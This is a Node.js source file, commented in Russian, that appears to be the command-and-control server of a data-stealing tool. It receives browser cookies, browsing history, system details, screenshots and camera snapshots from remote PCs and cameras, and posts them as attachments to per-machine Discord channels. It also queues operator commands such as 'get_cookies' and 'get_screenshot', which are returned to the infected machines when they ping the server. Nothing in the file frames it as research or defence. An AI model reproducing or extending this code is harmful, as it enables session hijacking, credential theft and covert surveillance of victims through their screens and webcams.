const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;// Универсальная функция логирования с троттлингом по ключу (если key передан)
async function logToDiscord(msg, key = null, minIntervalMs = LOG_THROTTLE_DEFAULT){
    try{
        if(key){
            const allowed = await throttleLog(key, minIntervalMs);
            if(!allowed) return; // пропускаем логирование, чтобы не флудить
        }
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    }catch(e){
        console.error("Ошибка логирования в Discord:", e);
    }
}

// ---------- Категории и каналы (ротация категорий если достигнут лимит CHILDREN) ----------
async function findOrCreateCategoryWithSpace(guild, baseName){
    // Ищем уже существующие категории с таким префиксом: baseName, baseName - 2, baseName - 3 ...
    const channels = await guild.channels.fetch();
    const categories = channels.filter(c => c.type === ChannelType.GuildCategory && c.name.startsWith(baseName));

    // Найдём категорию с количеством детей < CATEGORY_MAX_CHILDREN
    for(const cat of categories.values()){
        const children = channels.filter(ch => ch.parentId === cat.id);
        if(children.size < CATEGORY_MAX_CHILDREN) return cat;
    }

    // Если все полны или нет категорий — создаём новую с суффиксом (если baseName уже существует)
    let idx = 1;
    let name = baseName;
    const existingNames = new Set([...categories.values()].map(c=>c.name));
    while(existingNames.has(name)){
        idx++; name = `${baseName} - ${idx}`;
    }
    const created = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    return created;
}

async function getOrCreateCategory(guild, name){
    const gid = guild.id;
    if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid, {});
    const cache = categoryCacheByGuild.get(gid);
    if(cache[name]) return cache[name];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);

    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const cat of toDelete) try{ await cat.delete(); } catch(e){ console.error(e); }
        cache[name] = keep;
        return keep;
    }
    if(matches.size===1){ cache[name] = matches.first(); return matches.first(); }
    const created = await guild.channels.create({name, type:ChannelType.GuildCategory});
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const gid = guild.id;
    if(!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);
    const cacheKey = `${name}::${parentId}`;
    if(cache[cacheKey]) return cache[cacheKey];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const ch of toDelete) try{ await ch.delete(); } catch(e){ console.error(e); }
        cache[cacheKey] = keep;
        return keep;
    }
    if(matches.size===1){ cache[cacheKey] = matches.first(); return matches.first(); }

    // Перед созданием проверяем, не превысит ли родитель лимит детей
    const parent = await guild.channels.fetch(parentId).catch(()=>null);
    if(parent){
        const all = await guild.channels.fetch();
        const children = all.filter(ch => ch.parentId === parentId);
        if(children.size >= CATEGORY_MAX_CHILDREN){
            // найдём/создадим другую категорию с пространством
            const baseName = parent.name.includes(' - ') ? parent.name.split(' - ')[0] : parent.name;
            const fallbackCat = await findOrCreateCategoryWithSpace(guild, baseName);
            parentId = fallbackCat.id;
        }
    }

    const created = await guild.channels.create({name, type:ChannelType.GuildText, parent:parentId});
    await logToDiscord(`Создан канал ${name} в категории ${parentId}`, `channel_created:${name}`, 5*60*1000);
    cache[cacheKey] = created;
    return created;
}

// ---------- Получение канала логов ----------
async function getOrCreateLogChannel(guild){
    if(logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild, LOG_CATEGORY);
    logCategoryCache = category;

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===LOG_CHANNEL && c.parentId===category.id);
    let channel;
    if(matches.size>0) channel = matches.first();
    else channel = await guild.channels.create({ name:LOG_CHANNEL, type:ChannelType.GuildText, parent:category.id });
    logChannelCache = channel;
    return channel;
}

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Helpers для безопасной сериализации и вложений ----------
function safeStringify(obj, maxLen = MAX_FILE_SIZE){
    try{
        let s = JSON.stringify(obj, null, 2);
        if(Buffer.byteLength(s) <= maxLen) return s;
        // Попробуем урезать большие массивы в известных ключах
        const clone = JSON.parse(JSON.stringify(obj));
        const keysToTruncate = ['cookies','history','tabs','extensions'];
        for(const k of keysToTruncate){
            if(Array.isArray(clone[k]) && clone[k].length>200) clone[k] = clone[k].slice(0,200);
        }
        s = JSON.stringify(clone, null, 2);
        if(Buffer.byteLength(s) <= maxLen) return s;
        // Финальный ход: сокращаем до первых 10000 символов с пометкой
        return s.slice(0, Math.min(s.length, maxLen-200)) + '\n...TRUNCATED...';
    }catch(e){
        return 'serialization_error';
    }
}

// ---------- Обработка кнопок (unchanged) ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    const lastPing = onlinePCs[pcId];
    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

    const replyOptions = { ephemeral: true };
    if(command === "check_online") {
        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!isOnline){
        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Логика отправки данных от ПК (обновлено: безопасные имена, проверка размера файлов) ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});

        const isNewPc = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        // выбираем категорию с ротацией, если нужно
        const category = await findOrCreateCategoryWithSpace(guild, CATEGORY_BASE_PC);
        // безопасное имя канала
        const channelName = safeChannelName('pc', pcId);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
        channelByPC[pcId] = finalChannel.id;

        // троттлинг по отправке файлов в канал от одного ПК
        const now = Date.now();
        const lastSent = pcFileLastSent[pcId] || 0;
        const shouldSendFiles = (now - lastSent) > PC_DISCORD_UPLOAD_INTERVAL;

        const files = [];
        if(shouldSendFiles){
            if(cookies){
                const s = safeStringify({cookies});
                if(Buffer.byteLength(s) <= MAX_FILE_SIZE) files.push({ attachment: Buffer.from(s), name: `${channelName}-cookies.json` });
                else files.push({ attachment: Buffer.from(s.slice(0, MAX_FILE_SIZE-100)), name: `${channelName}-cookies-truncated.json` });
            }
            if(history){
                const s = safeStringify({history});
                if(Buffer.byteLength(s) <= MAX_FILE_SIZE) files.push({ attachment: Buffer.from(s), name: `${channelName}-history.json` });
                else files.push({ attachment: Buffer.from(s.slice(0, MAX_FILE_SIZE-100)), name: `${channelName}-history-truncated.json` });
            }
            if(systemInfo){
                const s = safeStringify({systemInfo});
                files.push({ attachment: Buffer.from(s), name: `${channelName}-system.json` });
            }
            if(screenshot){
                const buf = Buffer.from(screenshot, "base64");
                if(buf.length <= MAX_FILE_SIZE) files.push({ attachment: buf, name:`${channelName}-screenshot.jpeg` });
                else {
                    // слишком большой - не отправляем изображение, логируем
                    await logToDiscord(`Файл скриншота от ${pcId} превышает ${MAX_FILE_SIZE} байт и не был отправлен`, `file_too_large:${pcId}`, 60*1000);
                }
            }
        }

        if(files.length) {
            try{
                await finalChannel.send({ files, components: createControlButtons(pcId) });
                pcFileLastSent[pcId] = now;
                await logToDiscord(`📁 Данные ПК ${pcId} отправлены в канал ${finalChannel.name}`, `pc_upload:${pcId}`, 30*1000);
            }catch(e){
                // если ошибка parent max channels - попробуем создать другую категорию и повторить
                console.error('Error sending files to channel:', e);
                await logToDiscord(`❌ Ошибка отправки файлов в канал ${finalChannel.name}: ${e.message}`, `error:pc_send:${pcId}`, 30*1000);
            }
        } else {
            // если файлы троттлятся, отправим краткое обновление статуса (без вложений)
            const content = `🟢 ПК ${pcId} обновлён (таймстамп: ${new Date().toISOString()})`;
            try{
                await finalChannel.send({ content, components: createControlButtons(pcId) });
            }catch(e){
                console.error('Error sending status message:', e);
                await logToDiscord(`❌ Ошибка отправки статуса ПК ${pcId}: ${e.message}`, `error:pc_status:${pcId}`, 30*1000);
            }
        }

        if(isNewPc) await logToDiscord(`🖥 Новый ПК зарегистрирован: ${pcId}`, `pc_registered:${pcId}`, 5*60*1000);

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`, `error:upload-pc`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Логика для камер (обновлено: безопасные имена, ротация категорий, троттлинг) ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({ error:"camId and screenshot required" });

        // уведомляем ws клиенты всегда (для live view)
        if(wsCameraClients[camId]){
            wsCameraClients[camId].forEach(ws=>{
                try{ ws.send(screenshot); }catch(e){}
            });
        }

        const now = Date.now();
        const last = camLastUpload[camId] || 0;
        const shouldSendToDiscord = (now - last) > CAMERA_DISCORD_UPLOAD_INTERVAL;
        camLastUpload[camId] = now;

        // Троттлим лог регистрации камеры
        await logToDiscord(`📷 Камера активна: ${camId}`, `cam_active:${camId}`, 5*60*1000);

        if(shouldSendToDiscord){
            try{
                const guild = await bot.guilds.fetch(GUILD_ID);
                const category = await findOrCreateCategoryWithSpace(guild, CATEGORY_BASE_CAM);
                const channelName = safeChannelName('cam', camId);
                const channel = channelByCam[camId] ? await guild.channels.fetch(channelByCam[camId]).catch(()=>null) : null;
                const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
                channelByCam[camId] = finalChannel.id;

                const buffer = Buffer.from(screenshot, "base64");
                if(buffer.length <= MAX_FILE_SIZE){
                    await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
                    await logToDiscord(`📷 Снимок камеры ${camId} отправлен в ${finalChannel.name}`, `cam_snapshot_sent:${camId}`, 30*1000);
                } else {
                    await logToDiscord(`📷 Снимок камеры ${camId} слишком большой (${buffer.length} байт) и не отправлен`, `cam_snapshot_too_large:${camId}`, 60*1000);
                }
            }catch(e){
                console.error("Ошибка отправки снимка камеры в Discord:", e);
                await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`, `error:upload-cam`, 10*1000);
            }
        }

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`, `error:upload-cam`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Ping ----------
app.post("/ping", (req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({error:"pcId required"});
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({commands});
});

app.post("/ping-cam", (req,res)=>{
    const { camId } = req.body;
    if(!camId) return res.status(400).json({error:"camId required"});
    res.json({success:true});
});

// ---------- API фронта ----------
app.get("/api/online-pcs", (req,res)=> res.json(Object.keys(onlinePCs)));

// ---------- Статика ----------
app.use(express.static(join(__dirname,"public")));

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId");
    if(!camId) return ws.close();
    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);

    ws.on("close", ()=>{
        wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws);
    });
});

// ---------- HTTP Server ----------
const server = http.createServer(app);
server.on("upgrade", (request, socket, head)=>{
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);

// ---------- Логи ошибок Node ----------
process.on("uncaughtException", e=> logToDiscord(`💥 Uncaught Exception: ${e.message}`, `uncaught:${e.message}`, 10*1000));
process.on("unhandledRejection", e=> logToDiscord(`💥 Unhandled Rejection: ${e}`, `unhandled:${String(e)}`, 10*1000));
